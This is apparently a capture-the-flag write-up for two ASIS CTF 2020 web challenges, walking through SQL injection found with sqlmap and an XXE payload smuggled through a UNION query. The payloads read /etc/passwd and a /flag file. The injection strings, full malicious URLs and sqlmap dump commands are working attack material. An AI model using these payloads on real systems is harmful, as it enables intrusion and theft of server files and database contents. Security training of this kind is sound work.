# ASIS CTF Quals 2020 – Treasury

There are two different challenges under the same application.

## Treasury 1

* **Category:** web
* **Points:** 47

### Challenge

> A Cultural Treasury
> 
> https://poems.asisctf.com/

### Solution

The website contains a list of books with two actions available:
* *an excerpt* to read an excerpt of the book;
* *read online* which opens a link from another domain, not related to the challenge.

Analyzing the HTML source of the page a [treasury.js](treasury.js) file can be found; it is interesting to understand performed calls.

```javascript
async function anexcerpt(book) {
  const modalEl = document.createElement('div');
  modalEl.style.width = '70%';
  modalEl.style.height = '50%';
  modalEl.style.margin = '100px auto';
  modalEl.style.backgroundColor = '#fff';
  modalEl.className = 'mui-panel';
  const header = document.createElement('h2');
  header.appendChild(document.createTextNode("An Excerpt From " + book.name));
  modalEl.appendChild(header);
  const loading = createSpinner(modalEl);
  // show modal
  mui.overlay('on', modalEl);

  const response = await fetch('books.php?type=excerpt&id=' + book.id);
  const bookExcerpt = await response.text();
  const txtHolder = document.createElement('div');
  txtHolder.className = 'mui-textfield mui--z2'
  const txt = document.createElement('textarea');
  txt.appendChild(document.createTextNode(bookExcerpt));
  txt.readOnly = true;
  txt.style.height = "100%";
  txtHolder.appendChild(txt);
  txtHolder.style.height = "70%";
  loading.stop();
  modalEl.appendChild(txtHolder);
}

function readonline(book) {
  window.open(book.link);
}
```

The home page is created with the following request.

```
GET /books.php?type=list HTTP/1.1
Host: poems.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://poems.asisctf.com/
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 03 Jul 2020 21:39:04 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.7
Content-Length: 604

[{"id":"1","name":"D\u012bv\u0101n of Hafez","author":"Khw\u0101ja Shams-ud-D\u012bn Mu\u1e25ammad \u1e24\u0101fe\u1e93-e Sh\u012br\u0101z\u012b","year":"1315-1390","link":"https:\/\/ganjoor.net\/hafez\/ghazal\/sh255\/"},{"id":"2","name":"Gulistan of Saadi","author":"Ab\u016b-Muhammad Muslih al-D\u012bn bin Abdall\u0101h Sh\u012br\u0101z\u012b, the Saadi","year":"1258","link":"https:\/\/ganjoor.net\/saadi\/golestan\/gbab1\/sh36\/"},{"id":"3","name":"Shahnameh of Ferdowsi","author":"Abul-Q\u00e2sem Ferdowsi Tusi","year":"977-1010","link":"https:\/\/ganjoor.net\/ferdousi\/shahname\/jamshid\/sh1\/"}]
```

The excerpt button performs a request like the following.

```
GET /books.php?type=excerpt&id=1 HTTP/1.1
Host: poems.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://poems.asisctf.com/
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 03 Jul 2020 21:42:14 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.7
Content-Length: 1043

Joseph will come back to Canaan again, 
My house the fragrance of her rose-garden will regain.

0 sad heart, from hardships do not get mad,
Your worries will soon end- don’t feel so sad.

If the Spring on turf-throne would remain,
The bird under flower-canopy sits again.
 
If the world turns to your favor some days,
Take it easy; it won’t do so always.
 
If God’s secrets are unknown don’t despair.
Behind the mystery-curtain is a love-affair.
 
O’Heart, if death-flood sweeps off all life,
Your pilot as Noah, ends your strife.
 
When through desert you pass for pilgrimage,
If thorns bother your feet, don’t be in rage.

The road’s perilous and destination away.
Yet all roads have their ends, I daresay.
 
Enemies oppose me in absence of friend,
God knows that on Him I only depend.

Hafiz, the dark, lonely nights never mind, 
Study and pray- thus salvation you find.

Translator:
Kashani, A. A.  (1984).  Odes of Hafiz: Poetical horoscope. (pp. 182) Lexington: Mazda Publishers.
http://www.thesongsofhafiz.com/kashani1.htm
```

The read online button simply opens a window redirecting to the link specified for the book.

A URL like the following will reveal that web application is vulnerable to SQL injection, because the result of the book with `id=1` will be printed.

```
https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271
```

The following URL will spawn a weird error.

```
https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23



Warning: simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '<' not found in /code/books.php on line 54

Warning: simplexml_load_string(): 1 in /code/books.php on line 54

Warning: simplexml_load_string(): ^ in /code/books.php on line 54
```

It seems that the web application reads XML from a database.

You could use `sqlmap` to retrieve information.

```
user@host:~$ sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p id --delay 3 --dbms=mysql
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:59:52

[23:59:52] [INFO] testing connection to the target URL
[23:59:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:00:02] [INFO] testing if the target URL content is stable
[00:00:06] [INFO] target URL content is stable
[00:00:11] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[00:00:15] [INFO] testing for SQL injection on GET parameter 'id'
[00:00:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:01:05] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[00:01:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:01:10] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[00:01:10] [INFO] testing 'MySQL inline queries'
[00:01:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:01:14] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
[00:02:46] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:03:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:03:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:03:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:04:04] [INFO] target URL appears to have 1 column in query
[00:04:18] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:04:45] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.12
[00:04:45] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:04:45

user@host:~$ sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p id --delay 3 --dbms=mysql --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:05:09

[00:05:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:05:14] [INFO] testing MySQL
[00:05:19] [INFO] confirming MySQL
[00:05:33] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:05:33] [INFO] fetching database names
[00:05:37] [INFO] used SQL query returns 2 entries
[00:05:42] [INFO] retrieved: information_schema
[00:05:46] [INFO] retrieved: ASISCTF
available databases [2]:
[*] ASISCTF
[*] information_schema

[00:05:46] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:05:46

user@host:~$ sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p id --delay 3 --dbms=mysql -D ASISCTF --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:10:05

[00:10:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:10:10] [INFO] testing MySQL
[00:10:10] [INFO] confirming MySQL
[00:10:10] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:10:10] [INFO] fetching tables for database: 'ASISCTF'
[00:10:14] [INFO] used SQL query returns 1 entries
Database: ASISCTF
[1 table]
+-------+
| books |
+-------+

[00:10:19] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:10:19

user@host:~$ sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p id --delay 3 --dbms=mysql -D ASISCTF -T books --columns
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:11:07

[00:11:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:11:12] [INFO] testing MySQL
[00:11:12] [INFO] confirming MySQL
[00:11:12] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:11:12] [INFO] fetching columns for table 'books' in database 'ASISCTF'
[00:11:17] [INFO] used SQL query returns 2 entries
[00:11:21] [INFO] retrieved: "id","int(11)"
[00:11:26] [INFO] retrieved: "info","text"
Database: ASISCTF
Table: books
[2 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| id     | int(11) |
| info   | text    |
+--------+---------+

[00:11:26] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:11:26

user@host:~$ sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p id --delay 3 --dbms=mysql -D ASISCTF -T books --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:12:16

[00:12:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:12:21] [INFO] testing MySQL
[00:12:21] [INFO] confirming MySQL
[00:12:21] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:12:21] [INFO] fetching columns for table 'books' in database 'ASISCTF'
[00:12:21] [INFO] used SQL query returns 2 entries
[00:12:21] [INFO] resumed: "id","int(11)"
[00:12:21] [INFO] resumed: "info","text"
[00:12:21] [INFO] fetching entries for table 'books' in database 'ASISCTF'
[00:12:25] [INFO] used SQL query returns 3 entries
[00:12:30] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 1acszdq
[00:12:34] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 2acszdq
[00:12:39] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 3acszdq
[00:12:43] [WARNING] possible server trimmed output detected (probably due to its length and/or content): 1acszdq
[00:12:43] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[00:12:43] [INFO] fetching number of entries for table 'books' in database 'ASISCTF'
[00:12:43] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:12:43] [INFO] retrieved: 3
[00:13:15] [INFO] retrieved: 1
[00:13:56] [INFO] retrieved: <?xml version="1.0" encoding="UTF-8"?> <book>   <id>1</id>   <name>Dīvān of Hafez</name>   <author>Khwāja Shams-ud-Dīn Muḥammad Ḥāfeẓ-e Shīrāzī</author>   <year>1315-1390</year>   <link>https://ganjoor.net/hafez/ghazal/sh255/</link>   <flag>Your flag is not here! Read more books :)</flag>   <excerpt>Joseph will come back to Canaan again,  My house the fragrance of her rose-garden will regain.  0 sad heart, from hardships do not get mad, Your worries will soon end- don&#8217;t feel so sad.  If the Spring on turf-throne would remain, The bird under flower-canopy sits again.   If the world turns to your favor some days, Take it easy; it won&#8217;t do so always.   If God&#8217;s secrets are unknown don&#8217;t des^C
[07:05:43] [WARNING] Ctrl+C detected in dumping phase
Database: ASISCTF
Table: books
[1 entry]
+----+------+
| id | info |
+----+------+
| 1  |
+----+------+

[07:05:43] [INFO] table 'ASISCTF.books' dumped to CSV file '/home/ubuntu/.sqlmap/output/poems.asisctf.com/dump/ASISCTF/books.csv'
[07:05:43] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 07:05:43
```

So at this point you know that a `<flag>` XML element is hidden into `books` table, but not into book with `id = 1`; you can launch a custom query to exfiltrate only the `info` column for other books: `select info from ASISCTF.books where id > 1`.

```
user@host:~$ sqlmap -u "https://poems.asisctf.com/books.php?type=excerpt&id=1" -p id --delay 1 --dbms=mysql -D ASISCTF -T books --sql-query="select info from ASISCTF.books where id > 1"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 07:08:11

[07:08:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[07:08:14] [INFO] testing MySQL
[07:08:14] [INFO] confirming MySQL
[07:08:14] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[07:08:14] [INFO] fetching SQL SELECT statement query output: 'select info from ASISCTF.books where id > 1'
[07:08:17] [INFO] used SQL query returns 2 entries
[07:08:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[07:08:24] [INFO] retrieved: 2
the SQL query provided can return 2 entries. How many entries do you want to retrieve?
[a] All (default)
[#] Specific number
[q] Quit
> a
[07:09:42] [INFO] retrieved: <?xml version="1.0" encoding="UTF-8"?> <book>   <id>2</id>   <name>Gulistan of Saadi</name>   <author>Abū-Muhammad Muslih al-Dīn bin Abdallāh Shīrāzī, the Saadi</author>   <year>1258</year>   <link>https://ganjoor.net/saadi/golestan/gbab1/sh36/</link>   <flag>OK! You can use ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884} flag, but I keep the `/flag` file secure :-/</flag> ^C

[09:05:56] [WARNING] user aborted during dumping phase
[09:05:56] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 09:05:56
```

The flag is the following.

```
ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}
```

## Treasury 2

* **Category:** web
* **Points:** 53

### Challenge

> A Cultural Treasury
> 
> https://poems.asisctf.com/

### Solution

Considering the XML-related error spawned previously and the hint provided into the `<flag>` element talking about a `/flag` file, you can understand that the application can be exploited via a XXE attack.

The malicious payload can be crafted and passed via the SQL injection vulnerability using a `UNION` operation. The application will parse the XML payload triggering the remote file read operation.

Let's consider a payload like the following to test the exploit.

```
Payload:

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>

URL-encoded payload:

%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E

Malicious URL:

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%20%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%27%20%23

Result:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

So it is possible to read remote files. PHP filters can be used to read source code via base64 encoding.

```
Payload:

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>

URL-encoded payload:

%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E

Malicious URL:

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%20%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%20%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%20%3E%5D%3E%3Cbook%3E%3Cid%3E0%3C%2Fid%3E%3Cname%3En%3C%2Fname%3E%3Cauthor%3Ea%3C%2Fauthor%3E%3Cyear%3E0%3C%2Fyear%3E%3Clink%3El%3C%2Flink%3E%3Cflag%3Ef%3C%2Fflag%3E%3Cexcerpt%3E%26xxe%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%27%20%23

Result:

QVNJU3swMzQ4MmIxODIxMzk4Y2NiNTIxNGQ4OTFhZWQzNWRjODdkM2E3N2IyfQo=
```

Decoding the base64 encoded result you can obtain the flag.

```
ASIS{03482b1821398ccb5214d891aed35dc87d3a77b2}
```